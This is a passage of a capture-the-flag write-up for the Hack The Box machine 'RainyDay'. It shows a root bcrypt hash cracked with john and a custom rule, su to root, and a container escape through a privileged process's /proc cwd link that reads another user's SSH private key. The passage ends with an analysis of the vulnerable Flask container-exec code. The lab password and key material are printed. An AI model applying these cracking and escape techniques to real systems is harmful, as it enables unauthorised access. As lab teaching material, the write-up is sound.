+<h4 id="recover-password">Recover Password</h4>
+<p>Now I’ll run <code class="language-plaintext highlighter-rouge">john</code> with that rule, and it cracks in about a second:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>john root.hash <span class="nt">--rules</span><span class="o">=</span>rainyday <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+<span class="go">Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Enabling duplicate candidate password suppressor
+246813579H34vyR41n (root)     
+1g 0:00:00:01 DONE (2023-02-15 01:26) 0.5405g/s 5137p/s 5137c/s 5137C/s lilgirlH34vyR41n..101086H34vyR41n
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</span></code></pre></div></div>
+<h3 id="su">su</h3>
+<p>With the potential root password, I’ll try <code class="language-plaintext highlighter-rouge">su -</code>, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jack_adm@rainyday:/dev/shm$</span><span class="w"> </span>su -
+<span class="go">Password: 
+</span><span class="gp">root@rainyday:~#</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And I’ll grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@rainyday:~#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">5b2508a5************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="gary-to-shell">gary to Shell</h3>
+<p>The intended path is to work from gary’s container:</p>
+<ul>
+<li>use the file read to get the flask secret</li>
+<li>forging a cookie to get into jacks account</li>
+<li>get into jack’s container</li>
+<li>find the long running sleep process</li>
+<li>use that process to escape the jail, getting access to jack’s home directory and their SSH key</li>
+</ul>
+<p>jack’s processes run as uid 1000, where as when I run <code class="language-plaintext highlighter-rouge">id</code> in gary’s container, it returns 1337. Except that the background process runs as 1000, even as gary:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ $</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=1000 gid=1000
+</span></code></pre></div></div>
+<p>With this, from a container stood up under gary’s account, if I get a shell, I can see the long running <code class="language-plaintext highlighter-rouge">sleep</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/ $</span><span class="w"> </span>ps auxww
+<span class="go">PID   USER     TIME  COMMAND 
+...[snip]...
+1196 1000      0:00 sleep 100000000
+...[snip]...
+</span></code></pre></div></div>
+<p>Looking closer at the process, it’s the same sleep I abused above:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/proc/1196 $</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">total 0
+-r--r--r--    1 1000     1000             0 Feb 15 01:48 arch_status
+...[snip]...
+lrwxrwxrwx    1 1000     1000             0 Feb 10 20:36 cwd -&gt; /home/jack
+...[snip]...
+</span></code></pre></div></div>
+<p>And read the SSH key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">/proc/1196 $</span><span class="w"> </span><span class="nb">cat </span>cwd/.ssh/id_rsa
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
+qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
+SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
+JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
+/pLldRcUB09RUIoMPm8CR7ES/58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95
+...[snip]...
+</span></code></pre></div></div>
+<p>This allows for skipping the dev vhost and the file read entirely.</p>
+<h3 id="why">Why</h3>
+<p>So how does this happen? As root, I’ll go take a look at the webapp, <code class="language-plaintext highlighter-rouge">/var/www/rainycloud/app.py</code>. This is the block of code that handles incoming requests for containers from the “My Containers” page:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">action</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">create</span><span class="sh">"</span><span class="p">):</span>
+    <span class="n">action_cmd</span> <span class="o">=</span> <span class="n">action</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="nc">GetNewPort</span><span class="p">()</span>
+    <span class="n">container_name</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">action_cmd</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">-</span><span class="si">{</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
+    <span class="n">container_cmd</span> <span class="o">=</span> <span class="sh">"</span><span class="s">sh -c </span><span class="sh">'</span><span class="s">touch /logfile; chmod 777 /logfile; tail -f /logfile</span><span class="sh">'"</span>
+    <span class="n">docker_client</span><span class="p">.</span><span class="n">containers</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">image</span><span class="o">=</span><span class="n">container</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="n">container_cmd</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">container_name</span><span class="p">,</span> <span class="n">ports</span><span class="o">=</span><span class="p">{</span><span class="n">port</span><span class="p">:</span> <span class="n">port</span><span class="p">},</span> <span class="n">detach</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">network</span><span class="o">=</span><span class="sh">"</span><span class="s">rainyday</span><span class="sh">"</span><span class="p">,</span> <span class="n">publish_all_ports</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">restart_policy</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Name</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">always</span><span class="sh">"</span><span class="p">},</span> <span class="n">pid_mode</span><span class="o">=</span><span class="sh">"</span><span class="s">host</span><span class="sh">"</span><span class="p">,</span> <span class="n">privileged</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">container</span> <span class="o">=</span> <span class="n">docker_client</span><span class="p">.</span><span class="n">containers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">container</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">container</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">Invalid container</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>
+    <span class="k">if</span> <span class="n">container</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">Unauthorized</span><span class="sh">"</span><span class="p">,</span> <span class="mi">403</span>
+    <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">"</span><span class="s">stop</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">container</span><span class="p">.</span><span class="nf">stop</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">"</span><span class="s">logs</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">logs</span> <span class="o">=</span> <span class="n">container</span><span class="p">.</span><span class="nf">logs</span><span class="p">()</span>
+        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">logs</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Content-Disposition</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">attachment; filename=logs.txt</span><span class="sh">"</span><span class="p">})</span>
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">"</span><span class="s">start</span><span class="sh">"</span><span class="p">:</span>
+        <span class="n">container</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="sh">"</span><span class="s">delete</span><span class="sh">"</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">container</span><span class="p">.</span><span class="n">attrs</span><span class="p">[</span><span class="sh">'</span><span class="s">State</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">Running</span><span class="sh">'</span><span class="p">]:</span>
+            <span class="k">return</span> <span class="sh">"</span><span class="s">Container not stopped</span><span class="sh">"</span><span class="p">,</span> <span class="mi">400</span>
+        <span class="n">container</span><span class="p">.</span><span class="nf">remove</span><span class="p">()</span>
+    <span class="k">elif</span> <span class="n">action</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">execdetach</span><span class="sh">"</span><span class="p">):</span>
+        <span class="n">action_cmd</span> <span class="o">=</span> <span class="n">action</span><span class="p">[</span><span class="mi">10</span><span class="p">:]</span>
+        <span class="n">exit_code</span><span class="p">,</span> <span class="n">output</span> <span class="o">=</span> <span class="n">container</span><span class="p">.</span><span class="nf">exec_run</span><span class="p">(</span><span class="n">action_cmd</span><span class="p">,</span> <span class="n">detach</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">privileged</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="sh">"</span><span class="s">1000:1000</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">action</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">):</span>
+        <span class="n">action_cmd</span> <span class="o">=</span> <span class="n">action</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+        <span class="n">exit_code</span><span class="p">,</span> <span class="n">output</span> <span class="o">=</span> <span class="n">container</span><span class="p">.</span><span class="nf">exec_run</span><span class="p">(</span><span class="sh">"</span><span class="s">timeout 5s </span><span class="sh">"</span> <span class="o">+</span> <span class="n">action_cmd</span><span class="p">,</span> <span class="n">privileged</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="sh">"</span><span class="s">1000:1000</span><span class="sh">"</span> <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">jack</span><span class="sh">"</span> <span class="k">else</span> <span class="sh">"</span><span class="s">1337:1337</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="sh">"</span><span class="s">text/plain</span><span class="sh">"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">Content-Disposition</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">attachment; filename=command_output.txt</span><span class="sh">"</span><span class="p">})</span>
+</code></pre></div></div>
+<p>I’ll notice that the last one handles if the action starts with “exec”:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">elif</span> <span class="n">action</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">):</span>
+    <span class="n">action_cmd</span> <span class="o">=</span> <span class="n">action</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+    <span class="n">exit_code</span><span class="p">,</span> <span class="n">output</span> <span class="o">=</span> <span class="n">container</span><span class="p">.</span><span class="nf">exec_run</span><span class="p">(</span><span class="sh">"</span><span class="s">timeout 5s </span><span class="sh">"</span> <span class="o">+</span> <span class="n">action_cmd</span><span class="p">,</span> <span class="n">privileged</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="sh">"</span><span class="s">1000:1000</span><span class="sh">"</span> <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">jack</span><span class="sh">"</span> <span class="k">else</span> <span class="sh">"</span><span class="s">1337:1337</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>It sets the user to “1000:1000” if the session username is jack and “1337:1337” otherwise. So how did I get a shell as 1000:1000? The <code class="language-plaintext highlighter-rouge">elif</code> before that one is:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">elif</span> <span class="n">action</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">execdetach</span><span class="sh">"</span><span class="p">):</span>
+    <span class="n">action_cmd</span> <span class="o">=</span> <span class="n">action</span><span class="p">[</span><span class="mi">10</span><span class="p">:]</span>
+    <span class="n">exit_code</span><span class="p">,</span> <span class="n">output</span> <span class="o">=</span> <span class="n">container</span><span class="p">.</span><span class="nf">exec_run</span><span class="p">(</span><span class="n">action_cmd</span><span class="p">,</span> <span class="n">detach</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">privileged</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="sh">"</span><span class="s">1000:1000</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">execdetach</code> action (which is what comes from “Execute Command (background)”) always runs as 1000:1000, which is jack.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/02/18/htb-rainyday.html"></a>
+</article>
